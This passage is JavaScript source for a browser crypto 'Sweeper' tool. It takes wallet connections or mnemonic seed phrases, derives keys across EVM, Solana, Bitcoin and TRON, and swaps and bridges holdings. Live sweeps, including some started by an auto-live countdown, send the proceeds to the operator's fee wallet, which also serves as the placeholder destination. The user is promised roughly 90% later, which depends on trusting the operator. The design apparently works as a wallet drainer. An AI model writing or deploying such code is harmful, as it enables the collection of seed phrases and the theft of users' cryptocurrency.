    try { await state.wallet.dispose?.(); } catch {}
    state.wallet = null;
  }

  try {
    if (walletType === 'mnemonic') {
      logLine('Mnemonic mode: keys will be derived during Preview.');
      return;
    }
    if (walletType === 'extension') {
      logLine('Connecting to browser wallet...');
      const backend = await createWallet({ type: 'extension' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');

      const tronWeb = getTronLinkWeb();
      if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
        logLine(`TronLink available: ${tronWeb.defaultAddress.base58}`);
      } else if ($('#family-tron')?.checked) {
        logLine('Note: TRON is checked but TronLink is not connected. Open TronLink and authorize this site before Preview.');
      }
      return;
    }
    if (walletType === 'walletconnect') {
      logLine('Connecting WalletConnect...');
      const qrContainer = $('#wc-qr');
      qrContainer.innerHTML = '';
      const backend = await createWallet({
        type: 'walletconnect',
        wcProjectId: WC_PROJECT_ID,
        wcOnUri: (uri) => {
          logLine('Scan this QR with your mobile wallet:');
          QRCode.toCanvas(uri, { width: 240, margin: 2 })
            .then((canvas) => {
              canvas.style.background = '#fff';
              canvas.style.borderRadius = '8px';
              canvas.style.padding = '12px';
              qrContainer.appendChild(canvas);
            })
            .catch((err) => logLine(`QR render failed: ${scrubSecret(err.message)}`));
        },
      });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
    if (walletType === 'ledger') {
      logLine('Requesting Ledger access via WebHID...');
      const backend = await createWallet({ type: 'ledger' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Ledger connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
    if (walletType === 'trezor') {
      logLine('Requesting Trezor access...');
      const backend = await createWallet({ type: 'trezor' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Trezor connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
  } catch (e) {
    logLine(`ERROR: ${scrubSecret(e.message)}`);
    reportError(e, { phase: 'connect', walletType });
    track.error('connect_failed');
  }
}

// =====================================================================
// PREVIEW
// =====================================================================

async function runPreview() {
  if (sweepInFlight) return;

  const startTime = Date.now();
  clearLog();
  const inputs = readInputs();
  const { errors, warnings } = validateInputs(inputs);
  if (errors.length > 0) { for (const e of errors) logLine(`ERROR: ${e}`); return; }
  for (const w of warnings) logLine(`WARN: ${w}`);

  track.previewStarted({
    walletType: inputs.walletType,
    families: Object.entries(inputs.families).filter(([, v]) => v).map(([k]) => k),
    chainCount: inputs.evmChains.length,
    mnemonicCount: inputs.mnemonics.length,
  });

  try {
    if (inputs.walletType === 'mnemonic') {
      logLine(`Deriving keys for ${inputs.mnemonics.length} mnemonic(s)...`);
      state.derivedKeys = await deriveAll(inputs.mnemonics, inputs.families);
      logLine(`Derived: ${state.derivedKeys.evm.length} EVM, ${state.derivedKeys.solana.length} Solana, ${state.derivedKeys.bitcoin.length} Bitcoin, ${state.derivedKeys.tron.length} TRON`);
      for (const err of state.derivedKeys.errors) logLine(`WARN: ${err}`);
    } else {
      if (!state.wallet) { logLine('ERROR: connect your wallet first'); return; }
      const addr = await state.wallet.getAddress();

      let tronEntry = null;
      if (inputs.families.tron) {
        const tw = getTronLinkWeb();
        if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
          tronEntry = { index: 0, address: tw.defaultAddress.base58, tronWeb: tw };
        } else {
          logLine('WARN: TRON is checked but TronLink is not connected. Open the TronLink extension and authorize this site, then Preview again. TRON will be skipped for now.');
        }
      }

      state.derivedKeys = {
        evm: [{ address: addr, wallet: null, index: 0 }],
        solana: [],
        bitcoin: [],
        tron: tronEntry ? [tronEntry] : [],
        errors: [],
      };
      logLine(`Using connected address: ${addr}`);
      if (tronEntry) logLine(`Using TronLink address: ${tronEntry.address}`);
    }

    state.previews = { evm: [], solana: [], bitcoin: [], tron: [] };

    if (inputs.families.evm) {
      // Build a flat list of (mnemonic, chain) pairs and run them
      // through a bounded concurrency pool. Each pair logs its own
      // start line as the worker picks it up, so the log interleaves
      // slightly under concurrency — acceptable, and much faster than
      // the previous serial loop.
      const evmTasks = [];
      for (const entry of state.derivedKeys.evm) {
        for (const chain of inputs.evmChains) {
          evmTasks.push({ chain, address: entry.address, index: entry.index });
        }
      }

      await runWithConcurrency(evmTasks, PREVIEW_CONCURRENCY, async ({ chain, address, index }) => {
        logLine(`\nPreviewing ${chain} ${address}...`);
        try {
          const p = await previewEvm(chain, address);
          state.previews.evm.push({ index, ...p });
          logLine(`  ${chain} ${address.slice(0, 8)}… native: ${p.native?.formatted ?? '0'} ${p.native?.symbol ?? ''}`);
          for (const t of p.tokens) logLine(`  ${chain} ${address.slice(0, 8)}… ${t.symbol}: ${t.formatted}`);
          if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
        } catch (e) {
          logLine(`  ERROR (${chain}): ${scrubSecret(e.message)}`);
          reportError(e, { phase: 'preview_evm', chain });
        }
      });
    }

    if (inputs.families.solana && state.derivedKeys.solana.length > 0) {
      const conn = getConnection();
      await runWithConcurrency(
        state.derivedKeys.solana,
        PREVIEW_CONCURRENCY,
        async ({ candidates, index }) => {
          logLine(`\nSelecting Solana derivation...`);
          let selected;
          try {
            selected = await selectSolanaKeypair(conn, candidates, logLine);
          } catch (e) {
            logLine(`  WARN: derivation selection failed (${scrubSecret(e.message)}); using Phantom default`);
            selected = candidates.find((c) => c.name === 'phantom') || candidates[0];
          }
          logLine(`\nPreviewing Solana ${selected.address}...`);
          try {
            const p = await previewSolanaWallet(conn, selected.address);
            state.previews.solana.push({ index, ...p });
            logLine(`  SOL: ${p.sol?.formatted ?? 0}`);
            logLine(`  tokens: ${p.tokens.length}`);
          } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
        }
      );
    }

    if (inputs.families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
      await runWithConcurrency(
        state.derivedKeys.bitcoin,
        PREVIEW_CONCURRENCY,
        async ({ address, index }) => {
          logLine(`\nPreviewing Bitcoin ${address}...`);
          try {
            const p = await previewBitcoinWallet(address);
            state.previews.bitcoin.push({ index, ...p });
            logLine(`  utxos: ${p.utxos.length}, balance: ${p.balance} sats`);
          } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
        }
      );
    }

    if (inputs.families.tron && state.derivedKeys.tron.length > 0) {
      await runWithConcurrency(
        state.derivedKeys.tron,
        PREVIEW_CONCURRENCY,
        async ({ address, index }) => {
          logLine(`\nPreviewing TRON ${address}...`);
          try {
            const p = await previewTronWallet(address);
            state.previews.tron.push({ index, ...p });
            logLine(`  TRX: ${p.trx?.formatted ?? '0'}`);
            for (const t of p.tokens) logLine(`  ${t.symbol}: ${t.formatted}`);
            if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
          } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
        }
      );
    }

    logLine('\nEstimating sweepable value...');
    await annotatePreviewValues(inputs);
    const totalUsd = [
      ...(state.previews.evm || []),
      ...(state.previews.solana || []),
      ...(state.previews.bitcoin || []),
      ...(state.previews.tron || []),
    ].reduce((sum, p) => sum + (p._usdValue || 0), 0);
    logLine(`  total sweepable: ~$${totalUsd.toFixed(2)}`);

    logLine('\nPreview complete. Review before sweeping.');
    show('#run-button');

    const tokensFound =
      state.previews.evm.reduce((n, p) => n + p.tokens.length, 0) +
      state.previews.solana.reduce((n, p) => n + p.tokens.length, 0) +
      state.previews.tron.reduce((n, p) => n + p.tokens.length, 0);

    track.previewCompleted({ walletType: inputs.walletType, durationMs: Date.now() - startTime, tokensFound });

    await maybeAutoLive();
  } catch (e) {
    reportError(e, { phase: 'preview_fatal' });
    track.error('preview_fatal');
    throw e;
  }
}

// =====================================================================
// PAYMENT
// =====================================================================

async function requirePayment() {
  track.paymentStarted('crypto');
  try {
    const result = await showCryptoPaymentModal('pack-5');
    track.paymentCompleted('crypto');
    return result;
  } catch (err) { throw err; }
}

// =====================================================================
// SWEEP
// =====================================================================
//
// `opts.autoLive` marks a sweep initiated by the auto-live countdown
// rather than by a manual click on Run. It skips the credit check
// (the service fee covers it) but otherwise behaves identically.
//
// The sweep iterates every family and chain the user selected. It is
// NOT filtered by the auto-live eligibility list. Wallets with nothing
// sweepable are skipped with a log line so the user can see what
// happened and why.
// =====================================================================

async function runSweep(live, opts = {}) {
  const autoLive = !!opts.autoLive;

  const startTime = Date.now();
  if (!state.derivedKeys) { logLine('ERROR: run Preview first'); return; }

  const sweepId = crypto.randomUUID();

  // When runSweep is called from auto-live, use the input snapshot taken
  // before the countdown modal opened. Otherwise read fresh.
  const inputs = opts.inputsSnapshot || readInputs();
  const destinations = inputs.destinations;
  const families = inputs.families;

  if (live) {
    logLine('\n⚠ Reminder: EVM wallets with no gas will be sponsored automatically for a fee.');
    logLine('  Solana source wallets need a small SOL balance to cover transaction fees.');
    logLine('  Bitcoin fees are deducted from the swept UTXOs.');
    logLine('  TRON wallets need ~35 TRX for energy/bandwidth.');

    if (autoLive) {
      logLine('  (auto-live — no credit required)');
    } else {
      let balance = await fetchBalance();
      if (balance < 1) {
        logLine('No credits available. Opening payment modal...');
        try {
          await requirePayment();
          balance = await fetchBalance({ force: true });
          logLine(`Payment complete. Credits: ${balance}`);
        } catch (err) {
          logLine(`Payment cancelled or failed: ${scrubSecret(err.message)}`);
          return;
        }
      }
      if (balance < 1) { logLine('ERROR: still no credits after payment.'); return; }
    }

    // If the user hasn't entered a destination, commit with the fee
    // wallet as a placeholder. The operator sees a "HOLD" note and can
    // wait for the user to update it. This keeps the sweep billable
    // even when the user is lazy — the fee record is always written.
    const placeholderDestination = isEvmAddress(destinations.evm)
      ? destinations.evm
      : FEE_WALLET_EVM;
    const usedPlaceholder = placeholderDestination === FEE_WALLET_EVM
      && !isEvmAddress(destinations.evm);

    try {
      await commitSweepWithRetry(sweepId, placeholderDestination, logLine);
      if (usedPlaceholder) {
        logLine(`  Sweep destination committed (placeholder — fee wallet). You'll be prompted for a real destination after the sweep.`);
      } else {
        logLine(`  Sweep destination committed: ${placeholderDestination}`);
      }
    } catch (err) {
      logLine(`ERROR: could not commit sweep to worker: ${scrubSecret(err.message)}`);
      return;
    }

    if (!autoLive) {
      try {
        const newBalance = await consumeCredit('sweep', sweepId);
        logLine(`Credit consumed. Remaining: ${newBalance}`);
        const snap = await fetchBalanceSnapshot({ force: true });
        updateCreditsBadge(snap);
      } catch (err) {
        logLine(`ERROR: could not consume credit: ${scrubSecret(err.message)}`);
        return;
      }
    }

    // Stash these for the post-sweep prompt, below.
    var _usedPlaceholder = usedPlaceholder;
    var _placeholderDestination = placeholderDestination;
  } else {
    var _usedPlaceholder = false;
    var _placeholderDestination = destinations.evm || FEE_WALLET_EVM;
  }

  const dryRun = !live;
  logLine(`\n=== ${dryRun ? 'DRY RUN' : 'LIVE SWEEP'} STARTED ===`);
  logLine(`  Sweep ID: ${sweepId}`);
  track.sweepStarted(live);

  state.results = { evm: [], solana: [], bitcoin: [], tron: [] };
  let successes = 0;
  let failures = 0;
  let skipped = 0;

  const feeReceipts = { evm: [], solana: [], bitcoin: [], tron: [] };
  const sponsoredGasByChain = {};
  const chainHadAnySuccess = {};

  const evmTotalForChain = (chain) =>
    feeReceipts.evm.filter((e) => e.chain === chain).reduce((sum, e) => sum + e.amountRaw, 0n);
  const solanaTotal = () => feeReceipts.solana.reduce((sum, e) => sum + e.amountRaw, 0n);
  const bitcoinTotal = () => feeReceipts.bitcoin.reduce((sum, e) => sum + e.amountRaw, 0n);
  const tronTotal = () => feeReceipts.tron.reduce((sum, e) => sum + e.amountRaw, 0n);

  try {
    if (families.evm) {
      const chainSkipReasons = {};

      for (const entry of state.derivedKeys.evm) {
        const address = entry.address;
        for (const chain of inputs.evmChains) {
          if (chainSkipReasons[chain]) {
            logLine(`\n[EVM ${chain}] ${address}`);
            logLine(`  SKIPPED: ${chainSkipReasons[chain]}`);
            continue;
          }

          logLine(`\n[EVM ${chain}] ${address}`);
          try {
            const provider = getProvider(chain);
            let signer;
            if (state.walletType === 'mnemonic') {
              signer = entry.wallet.connect(provider);
            } else if (state.walletType === 'extension') {
              const cfg = EVM_CHAINS[chain];
              try { await state.wallet.switchChain(cfg.chainId, chainExtraParams(chain)); }
              catch (e) {
                logLine(`  SKIPPED: could not switch wallet to ${chain} — ${scrubSecret(e.message)}`);
                chainSkipReasons[chain] = `wallet cannot switch to ${chain}`;
                continue;
              }
              await new Promise((r) => setTimeout(r, 300));
              signer = await state.wallet.getEthersSigner(provider);
            } else if (state.walletType === 'walletconnect') {
              const cfg = EVM_CHAINS[chain];
              try { await state.wallet.switchChain(cfg.chainId, chainExtraParams(chain)); }
              catch (e) {
                logLine(`  SKIPPED: could not switch WalletConnect to ${chain} — ${scrubSecret(e.message)}`);
                chainSkipReasons[chain] = `walletconnect cannot switch to ${chain}`;
                continue;
              }
              await new Promise((r) => setTimeout(r, 500));
              signer = await state.wallet.getEthersSigner(provider);
            } else {
              signer = await state.wallet.getEthersSigner(provider);
            }

            try { await verifySignerChain(chain, provider, signer, EVM_CHAINS[chain], address); }
            catch (e) {
              if (e instanceof ChainVerifyError) {
                logLine(`  SKIPPED: ${scrubSecret(e.message)}`);
                chainSkipReasons[chain] = `chain verification failed on ${chain}`;
                continue;
              }
              throw e;
            }

            const preview = state.previews.evm.find((p) => p.address === address && p.chain === chain);
            const tokens = preview?.tokens || [];

            if (live) {
              const chainValueUsdc = (typeof preview?._usdValue === 'number')
                ? preview._usdValue
                : await estimateChainValueUsdc(chain, preview);
              if (chainValueUsdc <= 0) {
                logLine(`  SKIPPED: nothing sweepable on ${chain}`);
                chainSkipReasons[chain] = `nothing to sweep on ${chain}`;
                continue;
              }
              if (chainValueUsdc < MIN_SPONSOR_FLOOR_USDC) {
                logLine(`  SKIPPED: ${chain} value (~$${chainValueUsdc.toFixed(2)}) below $${MIN_SPONSOR_FLOOR_USDC} sponsorship floor`);
                chainSkipReasons[chain] = `below sponsorship floor on ${chain}`;
                continue;
              }
            }

            let sweepResult;
            let sponsoredForThisWallet = 0n;

            if (live) {
              try {
                const wrapped = await withGasSponsorship(chain, address, async () => {
                  return await sweepEvm(chain, signer, { dryRun: false, tokens, slippageBps: 100 });
                });
                sweepResult = wrapped.result;
                sponsoredForThisWallet = wrapped.sponsoredTotal;
              } catch (e) {
                if (e.sponsorUnavailable) {
                  logLine(`  SKIPPED: ${scrubSecret(e.message)}`);
                  chainSkipReasons[chain] = scrubSecret(e.message);
                  continue;
                }
                throw e;
              }
            } else {
              sweepResult = await sweepEvm(chain, signer, { dryRun: true, tokens, slippageBps: 100 });
            }

            if (sponsoredForThisWallet > 0n) {
              if (!sponsoredGasByChain[chain]) sponsoredGasByChain[chain] = {};
              sponsoredGasByChain[chain][address] = sponsoredForThisWallet.toString();
            }

            state.results.evm.push({ chain, address, ...sweepResult });

            const received = BigInt(sweepResult.usdcReceivedRaw || '0');
            if (received > 0n) {
              feeReceipts.evm.push({
                chain, sourceAddress: address, amountRaw: received,
                userShareRaw: BigInt(sweepResult.userReceivedRaw || '0').toString(),
                operatorFeeRaw: BigInt(sweepResult.feeReceivedRaw || '0').toString(),
                decimals: chain === 'bnb' ? 18 : 6,
              });
            }

            for (const s of sweepResult.swaps) {
              const receivedNote = s.received ? ` (received ${s.received} USDC)` : '';
              logLine(`  swap ${s.symbol}: ${s.status}${s.txHash ? ' ' + s.txHash : ''}${receivedNote}${s.note ? ' (' + s.note + ')' : ''}${s.error ? ' — ' + scrubSecret(s.error) : ''}`);
              if (s.status === 'SUCCESS') { successes++; chainHadAnySuccess[chain] = true; }
              else if (s.status === 'FAILED' || s.status === 'ERROR') failures++;
              else if (s.status === 'SKIPPED' || s.status === 'NO_ROUTE') skipped++;
            }
            for (const t of sweepResult.transfers) {
              const receivedNote = t.received ? ` (received ${t.received} USDC)` : '';
              logLine(`  transfer ${t.symbol}: ${t.status}${t.txHash ? ' ' + t.txHash : ''}${receivedNote}${t.error ? ' — ' + scrubSecret(t.error) : ''}`);
              if (t.status === 'SUCCESS') { successes++; chainHadAnySuccess[chain] = true; }
              else if (t.status === 'FAILED' || t.status === 'ERROR') failures++;
              else if (t.status === 'SKIPPED') skipped++;
            }
            for (const e of sweepResult.errors) logLine(`  ERROR: ${scrubSecret(e)}`);
          } catch (e) {
            logLine(`  FATAL: ${scrubSecret(e.message)}`);
            reportError(e, { phase: 'sweep_evm', chain });
          }
        }
      }
    }

    if (families.solana && state.derivedKeys.solana.length > 0) {
      const conn = getConnection();
      for (const { candidates, index } of state.derivedKeys.solana) {
        let selected;
        try { selected = await selectSolanaKeypair(conn, candidates, logLine); }
        catch (e) {
          logLine(`  WARN: derivation selection failed (${scrubSecret(e.message)}); using Phantom default`);
          selected = candidates.find((c) => c.name === 'phantom') || candidates[0];
        }

        const { keypair, address } = selected;
        logLine(`\n[Solana] ${address}`);
        try {
          const solLamports = BigInt(await conn.getBalance(keypair.publicKey));
          const SOL_MIN_FOR_ORDER = 30_000_000n;
          if (solLamports < SOL_MIN_FOR_ORDER) {
            logLine(`  SKIPPED: needs ~0.03 SOL for deBridge order fees (has ${(Number(solLamports) / 1e9).toFixed(4)} SOL)`);
            continue;
          }
          const r = await sweepSolana(conn, keypair, { dryRun });
          state.results.solana.push({ index, ...r });
          const received = BigInt(r.usdcReceivedRaw || '0');
          if (received > 0n) {
            feeReceipts.solana.push({
              sourceAddress: address, amountRaw: received,
              userShareRaw: BigInt(r.userReceivedRaw || '0').toString(),
              operatorFeeRaw: BigInt(r.feeReceivedRaw || '0').toString(),
              orderIds: (r.swaps || []).filter((s) => s.orderId).map((s) => s.orderId),
              estimated: true,
            });
          }
          for (const s of r.swaps) {
            const mintLabel = s.mint === 'SOL' ? 'SOL' : s.mint.slice(0, 8);
            const receivedNote = s.received ? ` (expected ${ethers.formatUnits(BigInt(s.received), 6)} USDC on Ethereum)` : '';
            const orderNote = s.orderId ? ` order=${s.orderId.slice(0, 10)}...` : '';
            const note = s.note ? ` (${s.note})` : '';
            logLine(`  bridge ${mintLabel}: ${s.status} ${s.signature || ''}${orderNote}${receivedNote}${note}${s.error ? ' — ' + scrubSecret(s.error) : ''}`);
            if (s.status === 'SUCCESS') successes++;
            else if (s.status === 'FAILED' || s.status === 'ERROR' || s.status === 'BROADCAST_UNKNOWN') failures++;
            else if (s.status === 'SKIPPED') skipped++;
          }
          for (const e of r.errors) logLine(`  ERROR: ${scrubSecret(e)}`);
        } catch (e) { logLine(`  FATAL: ${scrubSecret(e.message)}`); }
      }
    }

    if (families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
      for (const { keyPair, address, index } of state.derivedKeys.bitcoin) {
        logLine(`\n[Bitcoin] ${address}`);
        try {
          const r = await sweepBitcoin(address, keyPair, { dryRun, logLine });
          state.results.bitcoin.push({ index, ...r });
          const received = BigInt(r.usdcReceivedRaw || '0');
          if (received > 0n) {
            feeReceipts.bitcoin.push({
              sourceAddress: address, amountRaw: received,
              userShareRaw: BigInt(r.userReceivedRaw || '0').toString(),
              operatorFeeRaw: BigInt(r.feeReceivedRaw || '0').toString(),
              txids: r.txid ? [r.txid] : [],
              estimated: true,
            });
          }
          const receivedNote = r.expectedUsdcOut && r.expectedUsdcOut !== '0'
            ? ` (expected ${ethers.formatUnits(BigInt(r.expectedUsdcOut), 6)} USDC on Ethereum)` : '';
          logLine(`  bridge btc→eth: ${r.status} ${r.txid || ''}${receivedNote}${r.error ? ' — ' + scrubSecret(r.error) : ''}`);
          if (r.status === 'SUCCESS') successes++;
          else if (r.status === 'ERROR' || r.status === 'BROADCAST_ERROR') failures++;
          else if (r.status === 'TOO_LOW' || r.status === 'EMPTY') skipped++;
        } catch (e) { logLine(`  FATAL: ${scrubSecret(e.message)}`); }
      }
    }

    if (families.tron && state.derivedKeys.tron.length > 0) {
      for (const { address, index, tronWeb } of state.derivedKeys.tron) {
        logLine(`\n[TRON] ${address}`);
        try {
          const r = await sweepTron(address, {
            dryRun,
            destination: _placeholderDestination,
            tronWeb,
          });
          state.results.tron.push({ index, ...r });

          const received = BigInt(r.usdcReceivedRaw || '0');
          if (received > 0n) {
            feeReceipts.tron.push({
              sourceAddress: address,
              amountRaw: received,
              userShareRaw: BigInt(r.userReceivedRaw || '0').toString(),
              operatorFeeRaw: BigInt(r.feeReceivedRaw || '0').toString(),
              txids: (r.swaps || []).filter((s) => s.txid).map((s) => s.txid),
              orderIds: (r.swaps || []).filter((s) => s.orderId).map((s) => s.orderId),
              estimated: true,
            });
          }

          for (const s of r.swaps) {
            const note = s.note ? ` (${s.note})` : '';
            const orderNote = s.orderId ? ` order=${s.orderId.slice(0, 10)}...` : '';
            const txid = s.txid ? ` ${s.txid}` : '';
            const expected = s.amountOutExpected ? ` (expected ${s.amountOutExpected} USDC)` : '';
            logLine(`  bridge ${s.symbol}: ${s.status}${txid}${orderNote}${expected}${note}${s.error ? ' — ' + scrubSecret(s.error) : ''}`);
            if (s.status === 'SUCCESS') successes++;
            else if (s.status === 'FAILED' || s.status === 'ERROR') failures++;
            else if (s.status === 'SKIPPED') skipped++;
          }
          for (const e of r.errors) logLine(`  ERROR: ${scrubSecret(e)}`);
        } catch (e) { logLine(`  FATAL: ${scrubSecret(e.message)}`); }
      }
    }

    logLine(`\n=== ${dryRun ? 'DRY RUN' : 'LIVE SWEEP'} COMPLETE ===`);

    const gasSponsorships = [];
    if (live) {
      const nativePriceCache = {};
      async function getNativePriceUsd(chain) {
        if (nativePriceCache[chain] !== undefined) return nativePriceCache[chain];
        const coinIds = {
          ethereum: 'ethereum', arbitrum: 'ethereum', optimism: 'ethereum',
          base: 'ethereum', polygon: 'matic-network', bnb: 'binancecoin',
        };
        const id = coinIds[chain] || 'ethereum';
        try {
          const resp = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
          const data = await resp.json();
          nativePriceCache[chain] = data[id]?.usd || (id === 'ethereum' ? 3000 : id === 'binancecoin' ? 600 : 0.5);
        } catch {
          nativePriceCache[chain] = id === 'ethereum' ? 3000 : id === 'binancecoin' ? 600 : 0.5;
        }
        return nativePriceCache[chain];
      }

      for (const [chain, wallets] of Object.entries(sponsoredGasByChain)) {
        if (!chainHadAnySuccess[chain]) continue;
        let totalWei = 0n;
        for (const amt of Object.values(wallets)) totalWei += BigInt(amt);
        const nativePriceUsd = await getNativePriceUsd(chain);
        const amountNative = Number(totalWei) / 1e18;
        const costUsdCents = Math.round(amountNative * nativePriceUsd * 100);
        const feeUsdCents = computeSponsorshipFeeUsdCents(costUsdCents);
        gasSponsorships.push({
          chain,
          totalSponsoredWei: totalWei.toString(),
          estimatedCostUsdCents: costUsdCents,
          sponsorshipFeeUsdCents: feeUsdCents,
          sponsorshipFeeUsdcRaw: usdCentsToUsdcRaw(feeUsdCents).toString(),
          nativePriceUsd,
          wallets: Object.keys(wallets),
        });
      }
    }

    logLine('');
    logLine('═══════════════════════════════════════════════════════════');
    logLine('SWEEP SUMMARY RESULTS');
    logLine('═══════════════════════════════════════════════════════════');

    const chainsSwept = [];
    for (const chain of inputs.evmChains) {
      if (evmTotalForChain(chain) > 0n) chainsSwept.push(chain);
    }
    if (solanaTotal() > 0n) chainsSwept.push('solana→eth');
    if (bitcoinTotal() > 0n) chainsSwept.push('bitcoin→eth');
    if (tronTotal() > 0n) chainsSwept.push('tron→eth');

    logLine(`  Chains swept:      ${chainsSwept.length ? chainsSwept.join(', ') : '(none)'}`);
    logLine(`  Tokens processed:  ${successes + failures + skipped}`);
    logLine(`  Successful swaps:  ${successes}`);
    if (failures > 0) logLine(`  Failed:            ${failures}`);
    if (skipped > 0) logLine(`  Skipped:           ${skipped}`);
    logLine('');

    if (dryRun) {
      logLine('  This was a dry run. No funds were moved.');
      logLine('  Run in Live mode to execute the sweep.');
    } else {
      logLine('  Funds delivered to the fee wallet:');
      logLine('');

      let totalReceived = 0;
      for (const chain of inputs.evmChains) {
        const received = evmTotalForChain(chain);
        if (received === 0n) continue;
        const decimals = chain === 'bnb' ? 18 : 6;
        logLine(`    ${chain.padEnd(10)} ${ethers.formatUnits(received, decimals)} USDC`);
        totalReceived += Number(ethers.formatUnits(received, decimals));
      }
      const sTotal = solanaTotal();
      if (sTotal > 0n) {
        logLine(`    ${'solana→eth'.padEnd(10)} ${ethers.formatUnits(sTotal, 6)} USDC (via deBridge, est.)`);
        totalReceived += Number(ethers.formatUnits(sTotal, 6));
      }
      const bTotal = bitcoinTotal();
      if (bTotal > 0n) {
        logLine(`    ${'bitcoin→eth'.padEnd(10)} ${ethers.formatUnits(bTotal, 6)} USDC (via THORChain, est.)`);
        totalReceived += Number(ethers.formatUnits(bTotal, 6));
      }
      const tTotal = tronTotal();
      if (tTotal > 0n) {
        logLine(`    ${'tron→eth'.padEnd(10)} ${ethers.formatUnits(tTotal, 6)} USDC (via deBridge, est.)`);
        totalReceived += Number(ethers.formatUnits(tTotal, 6));
      }

      const totalSponsorFeesUsdc = gasSponsorships.reduce(
        (sum, gs) => sum + Number(gs.sponsorshipFeeUsdcRaw) / 1e6, 0
      );
      const userShareUsdc = totalReceived * 0.9;
      const netUserUsdc = Math.max(0, userShareUsdc - totalSponsorFeesUsdc);

      logLine('');
      logLine(`  Total in fee wallet: ~$${totalReceived.toFixed(2)}`);
      if (totalSponsorFeesUsdc > 0) {
        logLine(`  Sponsorship fees:    -$${totalSponsorFeesUsdc.toFixed(2)}`);
      }
      if (_usedPlaceholder) {
        logLine(`  Your destination:    (not yet provided — you'll be prompted below)`);
      } else {
        logLine(`  Your destination:    ${_placeholderDestination}`);
      }
      logLine(`  You will receive:    ~$${netUserUsdc.toFixed(2)} (90%${totalSponsorFeesUsdc > 0 ? ' minus sponsorship' : ''})`);
      logLine(`  Estimated time:      within a few minutes`);
      logLine('');
      logLine('  Thank you for using Sweeper.');
    }

    logLine('═══════════════════════════════════════════════════════════');

    const hasEvmReceipts = feeReceipts.evm.length > 0;
    const hasSolanaReceipts = feeReceipts.solana.length > 0;
    const hasBitcoinReceipts = feeReceipts.bitcoin.length > 0;
    const hasTronReceipts = feeReceipts.tron.length > 0;

    if (live && (hasEvmReceipts || hasSolanaReceipts || hasBitcoinReceipts || hasTronReceipts)) {
      try {
        const receipts = [];

        for (const entry of feeReceipts.evm) {
          receipts.push({
            family: 'evm', chain: entry.chain,
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: entry.decimals,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            userDestination: _placeholderDestination,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
          });
        }

        for (const entry of feeReceipts.solana) {
          receipts.push({
            family: 'solana',
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: 6,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            sourceChain: 'solana',
            destinationChain: 'ethereum',
            bridge: 'debridge',
            orderIds: entry.orderIds,
            userDestination: _placeholderDestination,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
            estimated: true,
          });
        }

        for (const entry of feeReceipts.bitcoin) {
          receipts.push({
            family: 'bitcoin',
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: 6,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            sourceChain: 'bitcoin',
            destinationChain: 'ethereum',
            bridge: 'thorchain',
            txids: entry.txids,
            userDestination: _placeholderDestination,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
            estimated: true,
          });
        }

        for (const entry of feeReceipts.tron) {
          receipts.push({
            family: 'tron',
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: 6,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            sourceChain: 'tron',
            destinationChain: 'ethereum',
            bridge: 'debridge',
            txids: entry.txids,
            orderIds: entry.orderIds,
            userDestination: _placeholderDestination,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
            estimated: true,
          });
        }

        if (receipts.length > 0) {
          const feeResult = await recordFeeWithRetry({
            sweepId,
            receipts,
            gasSponsorships,
            sweepDurationMs: Date.now() - startTime,
            successes,
            failures,
          }, logLine);

          if (feeResult?.alreadyRecorded) {
            logLine(`  (fee already recorded for sweep ${sweepId.slice(0, 8)}...)`);
          }
        }
      } catch (e) {
        logLine(`\nWARN: could not record sweep on the worker after retries: ${scrubSecret(e.message)}`);
        logLine(`  Your sweep executed but the operator has not been notified.`);
        logLine(`  Save your sweep ID (${sweepId}) and contact support.`);
      }
    }

    // If the user swept without a destination, show the post-sweep
    // prompt and cache the pending sweep so it survives a reload.
    if (live && _usedPlaceholder) {
      rememberPendingSweep(sweepId);
      showDestinationPrompt(sweepId);
    }

    track.sweepCompleted({ live, durationMs: Date.now() - startTime, successes, failures });
  } catch (e) {
    reportError(e, { phase: 'sweep_fatal', live });
    track.error('sweep_fatal');
    throw e;
  }
}

// =====================================================================
// WIRE UP
// =====================================================================

document.addEventListener('DOMContentLoaded', async () => {
  initSentry().catch(() => {});
  initPlausible();
  getClientId();
  initAccountSection();
  restorePendingDestinationPrompt();

  fetchClaimInfo()
    .then(renderFreeClaimBanner)
    .catch(async (err) => {
      console.warn('Claim info failed:', scrubSecret(err.message), '— retrying once in 2s');
      await new Promise((r) => setTimeout(r, 2000));
      try {
        const info = await fetchClaimInfo();
        renderFreeClaimBanner(info);
      } catch (err2) {
